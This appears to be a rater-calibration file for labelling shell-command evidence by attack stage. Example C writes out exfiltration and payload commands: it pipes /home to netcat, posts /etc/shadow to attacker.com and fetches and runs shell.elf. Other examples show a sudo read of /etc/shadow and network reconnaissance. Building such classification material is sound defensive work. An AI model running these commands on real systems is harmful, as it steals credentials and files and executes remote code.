# Annotation examples (not part of the evaluation set)

These examples are provided only to calibrate rater understanding of the taxonomy.

They are deliberately NOT members of `blind_annotation_packet_v2.json`.

## Example A — likely BENIGN
Evidence:
```
sysadmin@srv-01:~$ uptime
 06:49:57 up 22 min,  1 user,  load average: 2.21, 1.59, 1.01
sysadmin@srv-01:~$ date -u
Tue Sep 29 03:49:57 AM UTC 2026
```
Rationale: ordinary status checks with no credential access, no exploitation, no exfiltration.

## Example B — likely RECON
Evidence:
```
$ ifconfig
$ ip a
$ netstat -an
$ ss -tulnp
$ nmap -sV 10.0.0.0/24
```
Rationale: host and network discovery probes.

## Example C — likely EXPLOITATION attempt
Evidence:
```
$ tar czf - /home/ | nc 10.0.0.100 4444
$ base64 /etc/shadow | curl -d @- http://attacker.com/exfil
$ wget http://attacker.com/shell.elf -O /tmp/s
$ chmod +x /tmp/s && /tmp/s
```
Rationale: backconnect, exfiltration, and payload execution pattern.

## Example D — likely PRIVILEGE_ESCALATION attempt
Evidence:
```
$ sudo -n cat /etc/shadow
$ id; echo SSH_E2E_SIMPLE_1791701077; whoami
```
Rationale: unauthenticated sudo read of shadow plus enumeration.

## Example E — likely UNCERTAIN
Evidence:
```
$ What is T1190 Exploit Public-Facing Application?
$ Explain privilege escalation with sudo abuse
```
Rationale: informational/advisory phrasing; intent toward exploitation is stated but no direct action evidence is present.

## Annotation rules reminder
- Label what the evidence shows, not what the command string alone implies.
- Use UNCERTAIN when the evidence is genuinely ambiguous.
- Do not change another rater's file. If you disagree, flag it; do not overwrite.
